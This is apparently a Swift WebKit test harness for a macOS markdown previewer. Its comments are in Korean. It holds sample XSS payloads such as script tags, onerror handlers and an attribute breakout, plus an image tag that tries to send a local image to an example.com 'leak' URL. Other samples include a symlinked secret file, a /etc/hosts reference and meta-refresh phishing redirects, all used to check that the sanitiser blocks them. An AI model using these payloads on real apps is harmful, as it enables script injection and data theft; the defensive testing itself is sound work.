import Cocoa
import WebKit

// WKWebView에 띄워 보는 보안·동작 테스트. 앱과 같은 src/CoreBridge.swift(Rust core를 C 함수로 부른다)와
// 함께 컴파일하므로, 앱이 실제로 쓰는 경로로 만든 페이지를 띄운다(tests/run.sh 참고).
// 렌더러·리더·변환기 자체의 테스트는 Rust 쪽(cargo test, tests/spec, tests/converter.sh)에 있다.
//   harness webkit

var failures: [String] = []
var passes = 0

func check(_ ok: Bool, _ name: String, _ detail: @autoclosure () -> String = "") {
    if ok {
        passes += 1
    } else {
        failures.append(name)
        print("  ✗ \(name)\(detail().isEmpty ? "" : " — \(detail())")")
    }
}

func finish() -> Never {
    print("  \(passes)개 통과, \(failures.count)개 실패")
    exit(failures.isEmpty ? 0 : 1)
}

/// 테스트용 PNG(2x2). 저장소에 이미지 파일을 넣지 않으려고 실행 중에 만든다.
func pngData() -> Data {
    let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: 2, pixelsHigh: 2, bitsPerSample: 8,
                               samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                               colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0)!
    return rep.representation(using: .png, properties: [:])!
}

func makeTempDir() -> URL {
    let path = FileManager.default.temporaryDirectory.appendingPathComponent("peekdown-tests-\(UUID().uuidString)").path
    try! FileManager.default.createDirectory(atPath: path, withIntermediateDirectories: true)
    // 앱처럼 폴더 주소(끝에 /)로 둔다. 그래야 문서 속 상대 경로가 이 폴더 기준으로 풀린다
    return URL(fileURLWithPath: path, isDirectory: true)
}

final class Recorder: NSObject, WKNavigationDelegate {
    let guardian = NavigationGuard()
    var loaded = false
    var blocked: [String] = []
    func webView(_ webView: WKWebView, decidePolicyFor action: WKNavigationAction,
                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        if guardian.shouldBlock(action, in: webView) {
            blocked.append(action.request.url?.absoluteString ?? "nil")
            decisionHandler(.cancel)
            return
        }
        // 링크 클릭은 앱처럼 문서 밖으로 나가지 않게 막는다(앱은 이 경우 브라우저로 넘긴다)
        let leaves = action.navigationType == .linkActivated
            && !MdairHTML.isSameDocumentLink(action.request.url, currentURL: webView.url)
        decisionHandler(leaves ? .cancel : .allow)
    }
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) { loaded = true }
}

func wait(_ seconds: Double) { RunLoop.main.run(until: Date().addingTimeInterval(seconds)) }

/// 페이지를 띄우고 JS 식의 결과(JSON 문자열)를 돌려준다. before가 있으면 먼저 실행하고 잠시 기다린다.
func runPage(_ html: String, baseURL: URL?, before: String? = nil, settle: Double = 1.5, _ expression: String) -> (String, Recorder, WKWebView) {
    let recorder = Recorder()
    let webView = WKWebView(frame: NSRect(x: 0, y: 0, width: 800, height: 600))
    webView.navigationDelegate = recorder
    recorder.guardian.prepareForLoad(in: webView)
    webView.loadHTMLString(html, baseURL: baseURL)
    let deadline = Date().addingTimeInterval(10)
    while !recorder.loaded && Date() < deadline { wait(0.05) }
    wait(settle)
    if let before {
        var done = false
        webView.evaluateJavaScript(before) { _, _ in done = true }
        while !done { wait(0.05) }
        wait(1.0)
    }
    var result = ""
    var done = false
    webView.evaluateJavaScript(expression) { value, error in
        result = (value as? String) ?? "error: \(String(describing: error))"
        done = true
    }
    while !done { wait(0.05) }
    return (result, recorder, webView)
}

func json(_ s: String) -> [String: Any] {
    (try? JSONSerialization.jsonObject(with: Data(s.utf8))) as? [String: Any] ?? [:]
}

func page(_ markdown: String, baseDir: String? = nil) -> String {
    MdairHTML.page(forMarkdown: markdown, baseDir: baseDir)
}

func webkitTests() {
    _ = NSApplication.shared
    let dir = makeTempDir()
    defer { try? FileManager.default.removeItem(at: dir) }
    let png = pngData()
    for name in ["pic.png", "스크린 샷.png"] { try! png.write(to: dir.appendingPathComponent(name)) }
    try! "DUMMY-SECRET".write(to: dir.appendingPathComponent("secret.txt"), atomically: true, encoding: .utf8)
    try! FileManager.default.createSymbolicLink(at: dir.appendingPathComponent("logo.png"), withDestinationURL: dir.appendingPathComponent("secret.txt"))

    print("[webkit] 스크립트·파일 인라인·Mermaid")
    let attack = """
    # Evil

    <script>window.pwned = (window.pwned || '') + 'script;'</script>
    <img src="x" onerror="window.pwned = (window.pwned || '') + 'onerror;'">
    ![a](x" onerror="window.pwned = (window.pwned || '') + 'attr;')
    <img id="secret" src="secret.txt">
    <img id="hosts" src="/etc/hosts">
    <img id="raw" src="pic.png">
    <img id="exfil" src='https://example.com/leak?d= <img src="pic.png" '>
    <link rel="stylesheet" href="data:text/css,body%7Bcolor:rgb(1,2,3)!important%7D">

    ![link](logo.png) ![pic](pic.png)

    ![한글 이름](스크린%20샷.png)

    ```mermaid
    graph TD
      A-->B
    ```
    """
    let (result, _, _) = runPage(page(attack, baseDir: dir.path), baseURL: dir, """
    JSON.stringify({
      pwned: window.pwned || null,
      mermaid: document.querySelectorAll('.mermaid svg').length,
      secret: document.getElementById('secret').getAttribute('src'),
      hosts: document.getElementById('hosts').getAttribute('src'),
      link: [...document.images].filter(i => i.alt === 'link').map(i => i.getAttribute('src').slice(0, 5))[0] || null,
      pic: [...document.images].filter(i => i.alt === 'pic').map(i => i.getAttribute('src').slice(0, 14))[0] || null,
      raw: document.getElementById('raw').getAttribute('src'),
      exfil: document.getElementById('exfil').getAttribute('src').includes('data:'),
      korean: [...document.images].filter(i => i.alt === '한글 이름').map(i => i.getAttribute('src').slice(0, 14))[0] || null,
      color: getComputedStyle(document.body).color
    })
    """)
    let r = json(result)
    check(r["pwned"] is NSNull, "주입한 스크립트·onerror·속성 탈출이 실행되지 않음", "\(r["pwned"] ?? "nil")")
    check((r["mermaid"] as? Int) == 1, "Mermaid가 그려짐", result)
    check((r["secret"] as? String) == "secret.txt" && (r["hosts"] as? String) == "/etc/hosts", "이미지가 아닌 파일은 인라인하지 않음")
    check((r["link"] as? String) == "logo.", "비밀 파일을 가리키는 이미지 이름의 심볼릭 링크는 인라인하지 않음", "\(r["link"] ?? "nil")")
    check((r["pic"] as? String) == "data:image/png", "정상 이미지는 인라인")
    check((r["korean"] as? String) == "data:image/png", "한글·공백 파일 이름 이미지 인라인")
    check((r["raw"] as? String) == "pic.png", "raw HTML <img>는 인라인하지 않음", "\(r["raw"] ?? "nil")")
    check((r["exfil"] as? Bool) == false, "속성값 안에 숨긴 <img src>로 로컬 이미지를 원격 주소에 싣지 못함")
    check((r["color"] as? String) != "rgb(1, 2, 3)", "문서 속 외부 스타일시트는 CSP로 막힘", "\(r["color"] ?? "nil")")

    print("[webkit] 문서가 창을 다른 페이지로 옮기지 못함")
    for (label, body) in [("meta refresh 0초", "<meta http-equiv=\"refresh\" content=\"0;url=https://example.com/phish\">"),
                          ("meta refresh 1초", "<meta http-equiv=\"refresh\" content=\"1;url=https://example.com/phish\">"),
                          ("meta refresh data:", "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,x\">")] {
        let (_, recorder, webView) = runPage(page("# Doc\n\n\(body)\n"), baseURL: dir, settle: 2.0, "'ok'")
        check(webView.url?.scheme == "file", "\(label): 원래 문서에 머묾", "\(webView.url?.absoluteString ?? "nil")")
        check(!recorder.blocked.isEmpty, "\(label): 이동을 막은 기록이 있음")
    }
    let (_, formRecorder, formView) = runPage(page("<form action=\"https://example.com/post\"><button id=\"b\">go</button></form>\n"),
                                              baseURL: dir, before: "document.getElementById('b').click(); 1", "'ok'")
    check(formView.url?.scheme == "file", "폼 제출로 이동하지 않음", "\(formView.url?.absoluteString ?? "nil") \(formRecorder.blocked)")

    print("[webkit] 각주 링크는 문서 안에서 이동")
    let filler = (1...60).map { "Line \($0)." }.joined(separator: "\n\n")
    let notes = page("Claim.[^1]\n\n\(filler)\n\n[^1]: Note.\n")
    for (label, base) in [("파일 기준 주소", dir as URL?), ("about:blank", nil)] {
        let (state, _, _) = runPage(notes, baseURL: base, before: "document.querySelector('a[data-footnote-ref]').click(); 1",
                                    "JSON.stringify({hash: location.hash, y: scrollY})")
        let s = json(state)
        check((s["hash"] as? String) == "#fn-1" && ((s["y"] as? Int) ?? 0) > 0, "\(label): #fn-1로 스크롤", state)
    }

    print("[webkit] QuickLook·TextBundle 경로(C 함수)")
    // QuickLook은 샌드박스라 로컬 이미지를 못 읽는다. 못 읽은 수가 넘어와야 안내 문구를 붙일 수 있다
    let (body, missing) = MdairHTML.body(forMarkdown: "![a](pic.png)\n\n![b](nowhere.png)\n", baseDir: dir.path)
    check(missing == 1 && body.contains("data:image/png"), "본문과 못 읽은 이미지 수", "missing=\(missing)")
    check(MdairHTML.page(body: body, notice: "<div id=\"n\">notice</div>").contains("<div id=\"n\">notice</div>"), "안내 문구가 페이지에 들어감")
    let bundle = dir.appendingPathComponent("doc.textbundle")
    try! FileManager.default.createDirectory(at: bundle.appendingPathComponent("assets"), withIntermediateDirectories: true)
    try! "# Bundle\n\n![p](assets/pic.png)\n".write(to: bundle.appendingPathComponent("text.md"), atomically: true, encoding: .utf8)
    try! png.write(to: bundle.appendingPathComponent("assets/pic.png"))
    check(MdairHTML.page(forTextBundle: bundle.path)?.contains("data:image/png") == true, "TextBundle 페이지에 첨부 이미지가 들어감")
    check(MdairHTML.page(forTextBundle: dir.appendingPathComponent("none.textpack").path) == nil, "읽지 못하는 TextPack은 nil")
}

switch CommandLine.arguments.dropFirst().first {
case "webkit": webkitTests(); finish()
default:
    print("usage: harness webkit")
    exit(2)
}
